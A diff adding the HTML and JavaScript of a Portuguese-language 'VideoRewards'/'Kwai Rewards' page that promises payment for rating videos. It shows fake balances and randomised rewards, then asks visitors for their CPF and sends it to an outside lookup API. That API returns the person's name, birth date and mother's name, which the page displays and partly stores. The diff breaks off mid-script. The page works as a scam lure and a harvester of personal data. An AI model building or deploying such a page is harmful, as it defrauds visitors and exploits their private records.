@@ -1,0 +1,1221 @@
+<html lang="pt-BR">
+  <head>
+    <script
+      src="https://cdn.xtracky.com/scripts/utm-handler.js"
+      data-token="2fdecca8-9870-4260-81de-ab0eb47efee7"
+      data-click-id-param="click_id"
+    ></script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>VideoRewards - Assista, Ganhe, Resgate</title>
+    <meta
+      name="description"
+      content="A plataforma evolutiva que paga você para assistir e avaliar vídeos de qualidade."
+    />
+    <link rel="stylesheet" href="css/0c00818d925df931.css" />
+    <style>
+      /* Estilos para os novos pop-ups customizados */
+      /* Pop-up 1 - Bem-vindo com input de CPF */
+      .custom-popup-1 {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.8);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+      }
+
+      .custom-popup-1.show {
+        display: flex;
+      }
+
+      .custom-popup-1-content {
+        background: white;
+        border-radius: 16px;
+        padding: 32px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        color: #333;
+      }
+
+      .custom-popup-1 .warning-icon {
+        width: 60px;
+        height: 60px;
+        background: #ff8c00;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+      }
+
+      .custom-popup-1 .warning-triangle {
+        width: 0;
+        height: 0;
+        border-left: 12px solid transparent;
+        border-right: 12px solid transparent;
+        border-bottom: 20px solid white;
+      }
+
+      .custom-popup-1 h2 {
+        color: #333;
+        font-size: 24px;
+        font-weight: bold;
+        margin-bottom: 16px;
+      }
+
+      .custom-popup-1 p {
+        color: #333;
+        font-size: 14px;
+        line-height: 1.5;
+        margin-bottom: 24px;
+      }
+
+      .custom-popup-1 .cpf-input {
+        width: 100%;
+        padding: 12px 16px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        font-size: 16px;
+        margin-bottom: 20px;
+        text-align: center;
+        color: #333;
+      }
+
+      .custom-popup-1 .cpf-input::placeholder {
+        color: #999;
+      }
+
+      .custom-popup-1 .rescue-button {
+        width: 100%;
+        background: #ff8c00;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 14px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .custom-popup-1 .rescue-button:hover {
+        background: #ff7700;
+      }
+
+      .custom-popup-1 .rescue-button:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+      }
+
+      .custom-popup-1 .security-text {
+        color: #666;
+        font-size: 12px;
+        margin-top: 12px;
+        opacity: 0.8;
+      }
+
+      /* Pop-up 2 - Confirmação de dados */
+      .custom-popup-2 {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.8);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+      }
+
+      .custom-popup-2.show {
+        display: flex;
+      }
+
+      .custom-popup-2-content {
+        background: white;
+        border-radius: 16px;
+        padding: 32px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      }
+
+      .custom-popup-2 h2 {
+        color: #333;
+        font-size: 20px;
+        font-weight: bold;
+        margin-bottom: 24px;
+      }
+
+      .custom-popup-2 .user-data {
+        text-align: left;
+        margin-bottom: 24px;
+      }
+
+      .custom-popup-2 .user-data p {
+        color: #333;
+        font-size: 14px;
+        margin-bottom: 8px;
+      }
+
+      .custom-popup-2 .user-data strong {
+        color: #000;
+      }
+
+      .custom-popup-2 .confirm-button {
+        width: 100%;
+        background: #ff8c00;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 14px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .custom-popup-2 .confirm-button:hover {
+        background: #ff7700;
+      }
+
+      /* Pop-up 3 - Parabéns com valor */
+      .custom-popup-3 {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.8);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+      }
+
+      .custom-popup-3.show {
+        display: flex;
+      }
+
+      .custom-popup-3-content {
+        background: white;
+        border-radius: 16px;
+        padding: 32px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      }
+
+      .custom-popup-3 h2 {
+        color: #ff8c00;
+        font-size: 24px;
+        font-weight: bold;
+        margin-bottom: 16px;
+      }
+
+      .custom-popup-3 .success-message {
+        color: #333;
+        font-size: 14px;
+        line-height: 1.5;
+        margin-bottom: 16px;
+      }
+
+      .custom-popup-3 .reward-amount {
+        color: #ff8c00;
+        font-size: 32px;
+        font-weight: bold;
+        margin-bottom: 16px;
+      }
+
+      .custom-popup-3 .instruction-text {
+        color: #333;
+        font-size: 14px;
+        line-height: 1.5;
+        margin-bottom: 24px;
+      }
+
+      .custom-popup-3 .start-button {
+        width: 100%;
+        background: #ff8c00;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 14px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .custom-popup-3 .start-button:hover {
+        background: #ff7700;
+      }
+
+      /* Animações */
+      .custom-popup-1-content,
+      .custom-popup-2-content,
+      .custom-popup-3-content {
+        animation: popupSlideIn 0.3s ease-out;
+      }
+
+      @keyframes popupSlideIn {
+        from {
+          opacity: 0;
+          transform: scale(0.8) translateY(-20px);
+        }
+
+        to {
+          opacity: 1;
+          transform: scale(1) translateY(0);
+        }
+      }
+
+      /* Loading spinner */
+      .loading-spinner {
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #ff8c00;
+        border-radius: 50%;
+        width: 20px;
+        height: 20px;
+        animation: spin 1s linear infinite;
+        display: inline-block;
+        margin-right: 8px;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+
+  <body class="__className_e8ce0c">
+    <div class="min-h-screen bg-gray-50">
+      <header class="bg-gradient-to-r from-orange-500 to-red-400 text-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div class="flex items-center justify-between h-16">
+            <div class="flex items-center gap-2">
+              <div
+                class="w-8 h-8 bg-white rounded-lg flex items-center justify-center"
+              >
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  class="w-4 h-4 text-orange-500 fill-orange-500"
+                >
+                  <polygon points="6 3 20 12 6 21 6 3"></polygon>
+                </svg>
+              </div>
+              <span class="font-bold text-xl">Kwai Rewards</span>
+            </div>
+            <div class="flex items-center gap-6">
+              <div class="text-right">
+                <p class="text-sm opacity-90">Saldo disponível</p>
+                <p class="text-xl font-bold flex items-center gap-1">
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="w-5 h-5"
+                  >
+                    <line x1="12" x2="12" y1="2" y2="22"></line>
+                    <path
+                      d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
+                    ></path>
+                  </svg>
+                  <span id="balance">0.00</span>
+                </p>
+                <div class="flex items-center gap-2 text-sm">
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="w-4 h-4"
+                  >
+                    <polyline points="22 7 13.5 15.5 8.5 10.5 2 17"></polyline>
+                    <polyline points="16 7 22 7 22 13"></polyline>
+                  </svg>
+                  <span>+$<span id="today-earnings">0.00</span> hoje</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+      <div class="bg-white border-b border-gray-200 py-4">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div class="flex items-center justify-between">
+            <div>
+              <p id="user-display" class="text-base font-bold text-black mb-2">
+                Nome de usuário: -
+              </p>
+              <h2 class="text-lg font-semibold text-gray-800">Seu progresso</h2>
+              <p class="text-sm text-gray-600">
+                <span id="completed-videos">0</span>/5 vídeos
+              </p>
+            </div>
+            <div class="text-right">
+              <p class="text-sm text-gray-600">Avaliações concluídas</p>
+              <p class="text-lg font-semibold">
+                <span id="completed-evaluations">0</span> de 5
+              </p>
+              <button
+                class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 border border-input bg-background hover:bg-accent hover:text-accent-foreground h-9 rounded-md px-3 mt-1"
+              >
+                🔄 Restante: <span id="remaining-videos">5</span> vídeos
+              </button>
+            </div>
+          </div>
+          <div class="mt-3">
+            <div class="flex items-center gap-2 mb-2">
+              <span class="text-sm text-gray-600 flex items-center gap-1">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  class="w-4 h-4"
+                >
+                  <line x1="12" x2="12" y1="2" y2="22"></line>
+                  <path
+                    d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
+                  ></path>
+                </svg>
+                Ganhos: $<span id="total-earnings">0.00</span>
+              </span>
+            </div>
+            <div
+              class="relative w-full overflow-hidden rounded-full h-2 bg-gray-200"
+            >
+              <div
+                class="h-full bg-orange-500 transition-all"
+                id="progress-bar"
+                style="width: 0%"
+              ></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
+        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+          <div class="lg:col-span-3">
+            <div class="flex items-center justify-between mb-4">
+              <h3 class="text-xl font-bold text-gray-800">
+                Vídeo <span id="current-video">1</span>
+              </h3>
+              <div
+                class="inline-flex items-center rounded-full border font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 border-transparent hover:bg-primary/80 bg-orange-500 text-white text-lg px-3 py-1"
+              >
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  class="w-4 h-4 mr-1"
+                >
+                  <line x1="12" x2="12" y1="2" y2="22"></line>
+                  <path
+                    d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
+                  ></path>
+                </svg>
+                <span id="video-reward">15</span>
+              </div>
+            </div>
+            <div class="flex items-center gap-4 mb-4">
+              <div
+                class="flex items-center gap-2 bg-red-100 text-red-700 px-3 py-1 rounded-full"
+              >
+                <div
+                  class="w-2 h-2 bg-red-500 rounded-full animate-pulse"
+                ></div>
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  class="w-4 h-4"
+                >
+                  <path
+                    d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"
+                  ></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+                <span class="font-semibold"
+                  ><span id="viewers-count">0</span> assistindo agora</span
+                >
+              </div>
+              <div class="flex items-center gap-2 text-gray-600">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  class="w-4 h-4"
+                >
+                  <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+                  <circle cx="9" cy="7" r="4"></circle>
+                  <path d="M22 21v-2a4 4 0 0 0-3-3.87"></path>
+                  <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                </svg>
+                <span><span id="approved-count">0</span> aprovaram</span>
+              </div>
+            </div>
+            <div
+              class="rounded-lg border bg-card text-card-foreground shadow-sm mb-6"
+            >
+              <div class="p-0">
+                <div class="relative bg-black rounded-lg overflow-hidden">
+                  <div class="aspect-video">
+                    <iframe
+                      id="video-iframe"
+                      src="https://player.vimeo.com/video/1032050658?autoplay=1&amp;muted=1"
+                      class="w-full h-full"
+                      frameborder="0"
+                      allow="autoplay; fullscreen; picture-in-picture"
+                    ></iframe>
+                  </div>
+                  <div
+                    id="countdown-overlay"
+                    class="absolute bottom-4 left-4 right-4"
+                    style="display: none"
+                  >
+                    <div class="bg-black/80 rounded-lg p-3 text-white">
+                      <div class="flex justify-between text-sm mb-2">
+                        <span>Aguarde para avaliar</span>
+                        <span
+                          ><span id="countdown-seconds">5</span>s
+                          restantes</span
+                        >
+                      </div>
+                      <div
+                        class="relative w-full overflow-hidden rounded-full h-2 bg-gray-700"
+                      >
+                        <div
+                          class="h-full bg-orange-500 transition-all"
+                          id="countdown-bar"
+                          style="width: 0%"
+                        ></div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="mb-6">
+              <h4
+                class="text-lg font-semibold text-gray-800 mb-2"
+                id="video-title"
+              >
+                Amazing Travel Adventure in South America
+              </h4>
+              <div class="flex items-center gap-4 text-sm text-gray-600 mb-4">
+                <span id="video-creator">Travel Explorer</span> <span>•</span>
+                <span><span id="video-views">97K</span> visualizações</span>
+                <span>•</span> <span id="video-duration">15:32</span>
+              </div>
+              <div class="flex gap-4">
+                <button
+                  id="reject-btn"
+                  class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-destructive text-destructive-foreground hover:bg-destructive/90 h-10 px-4 py-2 flex-1 gap-2"
+                  disabled=""
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="w-4 h-4"
+                  >
+                    <path d="M17 14V2"></path>
+                    <path
+                      d="M9 18.12 10 14H4.17a2 2 0 0 1-1.92-2.56l2.33-8A2 2 0 0 1 6.5 2H20a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2h-2.76a2 2 0 0 0-1.79 1.11L12 22a3.13 3.13 0 0 1-3-3.88Z"
+                    ></path>
+                  </svg>
+                  Reprovar
+                </button>
+                <button
+                  id="approve-btn"
+                  class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 flex-1 gap-2 bg-orange-500 hover:bg-orange-600 text-white"
+                  disabled=""
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="w-4 h-4"
+                  >
+                    <path d="M7 10v12"></path>
+                    <path
+                      d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"
+                    ></path>
+                  </svg>
+                  Aprovar
+                </button>
+              </div>
+              <p
+                id="wait-message"
+                class="text-center text-sm text-gray-500 mt-3"
+              >
+                Aguarde <span id="wait-seconds">5</span> segundos para avaliar
+              </p>
+            </div>
+          </div>
+          <div class="lg:col-span-1">
+            <div
+              class="rounded-lg border bg-card text-card-foreground shadow-sm"
+            >
+              <div class="p-4">
+                <h3
+                  class="font-semibold text-gray-800 mb-4 flex items-center gap-2"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="w-4 h-4"
+                  >
+                    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="9" cy="7" r="4"></circle>
+                    <path d="M22 21v-2a4 4 0 0 0-3-3.87"></path>
+                    <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                  </svg>
+                  Atividade ao vivo
+                </h3>
+                <div class="space-y-3" id="activity-list">
+                  <!-- Atividade será inserida aqui via JavaScript -->
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+      <!-- Pop-up 1 - Bem-vindo com input de CPF -->
+      <div id="custom-popup-1" class="custom-popup-1">
+        <div class="custom-popup-1-content">
+          <div class="warning-icon">
+            <div class="warning-triangle"></div>
+          </div>
+          <h2>Bem-vindo!</h2>
+          <p>
+            Para liberar suas avaliações e garantir que os pagamentos sejam
+            registrados no seu nome, preencha seu CPF com segurança no campo
+            abaixo:
+          </p>
+          <input
+            type="text"
+            class="cpf-input"
+            id="cpf-input"
+            placeholder="Digite seu CPF"
+            maxlength="11"
+          />
+          <button class="rescue-button" id="rescue-btn">Resgatar Agora!</button>
+          <p class="security-text">
+            É rápido e garante a segurança dos seus dados.
+          </p>
+        </div>
+      </div>
+      <!-- Pop-up 2 - Confirmação de dados -->
+      <div id="custom-popup-2" class="custom-popup-2">
+        <div class="custom-popup-2-content">
+          <h2>Confirme seus dados</h2>
+          <div class="user-data" id="user-data">
+            <p>
+              <strong>Nome:</strong> <span id="user-name">Carregando...</span>
+            </p>
+            <p>
+              <strong>Nascimento:</strong>
+              <span id="user-birth">Carregando...</span>
+            </p>
+            <p>
+              <strong>Mãe:</strong> <span id="user-mother">Carregando...</span>
+            </p>
+          </div>
+          <button class="confirm-button" id="confirm-btn">Confirmar</button>
+        </div>
+      </div>
+      <!-- Pop-up 3 - Parabéns com valor -->
+      <div id="custom-popup-3" class="custom-popup-3">
+        <div class="custom-popup-3-content">
+          <h2 id="congrats-title">Parabéns!</h2>
+          <p class="success-message">
+            Você acaba de ganhar 1 licença gratuita para avaliar marcas em nosso
+            app!
+          </p>
+          <p class="success-message">Aproveite, você já ganhou</p>
+          <div class="reward-amount" id="final-reward">R$15!</div>
+          <p class="instruction-text">
+            Faça 5 avaliações e realize seu primeiro saque!
+          </p>
+          <button class="start-button" id="start-btn">Começar</button>
+        </div>
+      </div>
+      <nav
+        class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200"
+      >
+        <div class="max-w-7xl mx-auto px-4">
+          <div class="flex items-center justify-around py-3">
+            <a
+              class="flex flex-col items-center gap-1 text-orange-500"
+              href="/"
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                class="w-5 h-5"
+              >
+                <path d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"></path>
+                <path
+                  d="M3 10a2 2 0 0 1 .709-1.528l7-5.999a2 2 0 0 1 2.582 0l7 5.999A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"
+                ></path>
+              </svg>
+              <span class="text-xs">Início</span>
+            </a>
+            <a
+              class="flex flex-col items-center gap-1 text-gray-500"
+              href="/videos"
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                class="w-5 h-5"
+              >
+                <circle cx="11" cy="11" r="8"></circle>
+                <path d="m21 21-4.3-4.3"></path>
+              </svg>
+              <span class="text-xs">Explorar</span>
+            </a>
+            <div class="flex flex-col items-center gap-1 text-gray-500">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                class="w-5 h-5"
+              >
+                <rect x="3" y="8" width="18" height="4" rx="1"></rect>
+                <path d="M12 8v13"></path>
+                <path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"></path>
+                <path
+                  d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5"
+                ></path>
+              </svg>
+              <span class="text-xs">Ganhos</span>
+            </div>
+            <div class="flex flex-col items-center gap-1 text-gray-500">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                class="w-5 h-5"
+              >
+                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
+                <circle cx="12" cy="7" r="4"></circle>
+              </svg>
+              <span class="text-xs">Perfil</span>
+            </div>
+          </div>
+        </div>
+      </nav>
+    </div>
+    <script>
+      // Variáveis globais principais
+      let currentVideoIndex = 0;
+      let completedEvaluations = 0;
+      let totalEarnings = 0;
+      let balance = 0;
+      let todayEarnings = 0;
+      let canEvaluate = false;
+      let countdownInterval;
+      let currentReward = 0;
+      let userApiData = null;
+      let isFirstEvaluation = true;
+
+      // Dados dos vídeos (mantém os vídeos e a recompensa aleatória)
+      const videos = [
+        {
+          id: "1",
+          title: "Amazing Travel Adventure in South America",
+          creator: "Travel Explorer",
+          views: "97K",
+          duration: "15:32",
+          videoUrl: "https://player.vimeo.com/video/1032050658",
+          reward: Math.floor(Math.random() * 11) + 5,
+        },
+        {
+          id: "2",
+          title: "Incredible Technology Innovation",
+          creator: "Tech Master",
+          views: "156K",
+          duration: "22:45",
+          videoUrl: "https://player.vimeo.com/video/1070099527",
+          reward: Math.floor(Math.random() * 11) + 5,
+        },
+        {
+          id: "3",
+          title: "Lifestyle and Wellness Tips",
+          creator: "Wellness Guru",
+          views: "203K",
+          duration: "18:20",
+          videoUrl: "https://player.vimeo.com/video/1048742716",
+          reward: Math.floor(Math.random() * 11) + 5,
+        },
+        {
+          id: "4",
+          title: "Business Success Strategies",
+          creator: "Business Pro",
+          views: "89K",
+          duration: "12:15",
+          videoUrl: "https://player.vimeo.com/video/1072589160",
+          reward: Math.floor(Math.random() * 11) + 5,
+        },
+        {
+          id: "5",
+          title: "Creative Arts and Design",
+          creator: "Creative Studio",
+          views: "45K",
+          duration: "25:10",
+          videoUrl: "https://player.vimeo.com/video/1052869617",
+          reward: Math.floor(Math.random() * 11) + 5,
+        },
+      ];
+
+      // Atualiza dados na interface
+      function updateUI() {
+        const currentVideo = videos[currentVideoIndex];
+
+        document.getElementById("balance").textContent = balance.toFixed(2);
+        document.getElementById("today-earnings").textContent =
+          todayEarnings.toFixed(2);
+        document.getElementById("completed-videos").textContent =
+          completedEvaluations;
+        document.getElementById("completed-evaluations").textContent =
+          completedEvaluations;
+        document.getElementById("remaining-videos").textContent =
+          5 - completedEvaluations;
+        document.getElementById("total-earnings").textContent =
+          totalEarnings.toFixed(2);
+        document.getElementById("progress-bar").style.width =
+          (completedEvaluations / 5) * 100 + "%";
+
+        document.getElementById("current-video").textContent =
+          currentVideoIndex + 1;
+        document.getElementById("video-reward").textContent =
+          currentVideo.reward;
+        document.getElementById("video-title").textContent = currentVideo.title;
+        document.getElementById("video-creator").textContent =
+          currentVideo.creator;
+        document.getElementById("video-views").textContent = currentVideo.views;
+        document.getElementById("video-duration").textContent =
+          currentVideo.duration;
+        document.getElementById("video-iframe").src =
+          currentVideo.videoUrl + "?autoplay=1&muted=1";
+      }
+
+      // Contador regressivo para liberar avaliação
+      function startCountdown() {
+        let seconds = 5;
+        let progress = 0;
+
+        document.getElementById("countdown-overlay").style.display = "block";
+        document.getElementById("wait-message").style.display = "block";
+
+        countdownInterval = setInterval(() => {
+          progress += 20;
+          seconds--;
+
+          document.getElementById("countdown-seconds").textContent = seconds;
+          document.getElementById("wait-seconds").textContent = seconds;
+          document.getElementById("countdown-bar").style.width = progress + "%";
+
+          if (seconds <= 0) {
+            clearInterval(countdownInterval);
+            document.getElementById("countdown-overlay").style.display = "none";
+            document.getElementById("wait-message").style.display = "none";
+            canEvaluate = true;
+            document.getElementById("approve-btn").disabled = false;
+            document.getElementById("reject-btn").disabled = false;
+          }
+        }, 1000);
+      }
+
+      // Busca dados do usuário via API (por CPF)
+
+      async function fetchUserData(cpf) {
+
+        
+        const url = `https://base1.sistemafull.site:80/api/cpfx?CPF=${cpf}`; // url da api
+
+        try {
+          const response = await fetch(url);
+
+          if (!response.ok) throw new Error(`Erro HTTP ${response.status}`);
+          const data = await response.json();
+          console.log("fetch:" + data);
+          // return data && data.dados && data.dados.length > 0 ? data.dados[0] : null;
+          return data || null;
+        } catch (error) {
+          console.error("Erro ao buscar dados:", error);
+          return null;
+        }
+      }
+
+      // Abrir primeiro popup para resgate da recompensa
+      function openCustomPopup1(reward) {
+        currentReward = reward;
+        document.getElementById("custom-popup-1").classList.add("show");
+      }
+
+      // Passa para o segundo popup com os dados do usuário após validação do CPF
+      async function goToCustomPopup2() {
+        const cpfInput = document.getElementById("cpf-input").value;
+        if (!cpfInput) return alert("Por favor, digite seu CPF");
+
+        const cleanCpf = cpfInput.replace(/[^\d]/g, "");
+        if (cleanCpf.length !== 11)
+          return alert("Por favor, digite um CPF válido");
+
+        const rescueBtn = document.getElementById("rescue-btn");
+        rescueBtn.innerHTML =
+          '<span class="loading-spinner"></span>Carregando...';
+        rescueBtn.disabled = true;
+
+        const apiData = await fetchUserData(cleanCpf);
+        console.log(apiData);
+        if (apiData) {
+          userApiData = apiData;
+
+          // ✅ Salva nome e CPF no localStorage
+          localStorage.setItem(
+            "userData",
+            JSON.stringify({
+              nome: apiData.NOME || apiData.nome || "",
+              cpf: apiData.CPF || apiData.cpf || "",
+            })
+          );
+
+          // Atualizar o nome do usuário na página principal
+          const userName = apiData.NOME || apiData.nome || "Usuário";
+          document.getElementById(
+            "user-display"
+          ).textContent = `Nome de usuário: ${userName}`;
+
+          document.getElementById("user-name").textContent =
+            apiData.NOME || apiData.nome || "Não informado";
+          document.getElementById("user-birth").textContent =
+            apiData.NASCIMENTO || apiData.nascimento || "Não informado";
+          document.getElementById("user-mother").textContent =
+            apiData.MAE || apiData.mae || "Não informado";
+
+          document.getElementById("custom-popup-1").classList.remove("show");
+          document.getElementById("custom-popup-2").classList.add("show");
+        } else {
+          alert("Erro ao buscar dados. Tente novamente.");
+        }
+
+        rescueBtn.innerHTML = "Resgatar Agora!";
+        rescueBtn.disabled = false;
+      }
+
+      // Abrir terceiro popup de confirmação final e recompensa
+      function goToCustomPopup3() {
+        document.getElementById(
+          "final-reward"
+        ).textContent = `R$${currentReward}!`;
+
+        // Se temos dados do usuário da API, usar apenas o primeiro nome no Pop-up3
+        if (userApiData && (userApiData.NOME || userApiData.nome)) {
+          const fullName = userApiData.NOME || userApiData.nome;
+          const firstName = fullName.split(" ")[0];
+
+          // Atualizar o título do Pop-up3 para mostrar apenas o primeiro nome
+          const popup3Title = document.querySelector("#custom-popup-3 h2");
+          if (popup3Title) {
+            popup3Title.textContent = `Parabéns, ${firstName}!`;
+          }
+        }
+
+        document.getElementById("custom-popup-2").classList.remove("show");
+        document.getElementById("custom-popup-3").classList.add("show");
+      }
+
+      // Fecha todos os popups e limpa dados temporários
+      function closeAllCustomPopups() {
+        document.getElementById("custom-popup-1").classList.remove("show");
+        document.getElementById("custom-popup-2").classList.remove("show");
+        document.getElementById("custom-popup-3").classList.remove("show");
+        document.getElementById("cpf-input").value = "";
+        userApiData = null;
+      }
+
+      // Lida com avaliação de vídeo (aprovado ou reprovado)
+      function handleEvaluation(isApproved) {
+        if (!canEvaluate) return;
+
+        const currentVideo = videos[currentVideoIndex];
+        const reward = isApproved
+          ? currentVideo.reward
+          : Math.floor(0.7 * currentVideo.reward);
+
+        if (isFirstEvaluation) {
+          isFirstEvaluation = false;
+          openCustomPopup1(reward);
+        } else {
+          // Mostrar o Pop-up 4 após aprovação/reprovação
+          showPopup4(reward);
+        }
+      }
+
+      // Função para mostrar o Pop-up 4 após aprovação/reprovação
